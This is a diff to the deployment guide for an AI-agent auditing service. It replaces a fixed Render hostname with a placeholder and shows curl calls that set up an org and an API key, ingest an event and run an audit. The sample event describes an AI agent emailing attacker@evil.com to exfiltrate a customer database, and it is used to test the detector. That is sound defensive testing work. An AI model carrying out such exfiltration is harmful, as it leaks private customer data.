@@ -41,14 +41,20 @@ All required env vars are documented in `.env.example`. Never commit real secret
    | `TELUVANE_SECRET_KEY` | Generate: `python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())"` |
    | `FRONTEND_ORIGIN` | Set after Vercel deploy (step 3 below) |
 
-4. Click **Deploy**. Wait for the health check to pass:
+4. Click **Deploy**. Render assigns the URL from whatever service name you gave it in step
+   1 (`https://<your-service-name>.onrender.com`) — it does **not** have to match the repo or
+   package name, and won't necessarily match `render.yaml`'s `name:` field unless you deployed
+   from that blueprint. Copy the exact URL from the Render dashboard rather than guessing it;
+   pointing `NEXT_PUBLIC_API_URL` (step 3) at a guessed hostname that happens to not exist is a
+   silent failure — the browser's TLS handshake to `*.onrender.com` succeeds either way, so the
+   dashboard hangs on "Loading..." instead of erroring.
+5. Wait for the health check to pass, using the URL from the dashboard:
    ```bash
-   curl -s https://teluvane-api.onrender.com/health
+   curl -s https://<your-service-name>.onrender.com/health
    # {"status":"ok"}
-   curl -s https://teluvane-api.onrender.com/ready
+   curl -s https://<your-service-name>.onrender.com/ready
    # {"db": true}
    ```
-5. Note your Render URL (e.g. `https://teluvane-api.onrender.com`).
 
 ---
 
@@ -88,12 +94,12 @@ After all three services are live:
 # 1. Sign up via the Vercel frontend, then get your JWT from the browser session.
 
 # 2. Create an org + API key (replace $JWT with your session token)
-curl -s -X POST https://teluvane-api.onrender.com/orgs \
+curl -s -X POST https://<your-service-name>.onrender.com/orgs \
   -H "Authorization: Bearer $JWT" \
   -H "Content-Type: application/json" \
   -d '{"name":"Acme"}'
 
-curl -s -X POST https://teluvane-api.onrender.com/keys \
+curl -s -X POST https://<your-service-name>.onrender.com/keys \
   -H "Authorization: Bearer $JWT" \
   -H "Content-Type: application/json" \
   -d '{"name":"prod"}'
@@ -101,13 +107,13 @@ curl -s -X POST https://teluvane-api.onrender.com/keys \
 
 # 3. Ingest an event
 KEY=tv_live_...
-curl -s -X POST https://teluvane-api.onrender.com/events \
+curl -s -X POST https://<your-service-name>.onrender.com/events \
   -H "Authorization: Bearer $KEY" \
   -H "Content-Type: application/json" \
   -d '{"agent_id":"a","session_id":"live1","kind":"tool_call","tool":"send_email","args":{"to":"attacker@evil.com"},"intent":"exfiltrate customer database"}'
 
 # 4. Run audit
-curl -s -X POST https://teluvane-api.onrender.com/audit/live1 \
+curl -s -X POST https://<your-service-name>.onrender.com/audit/live1 \
   -H "Authorization: Bearer $JWT"
 # Returns a data_exfiltration violation (offline detector, or live Claude if BYOK is set)
 ```
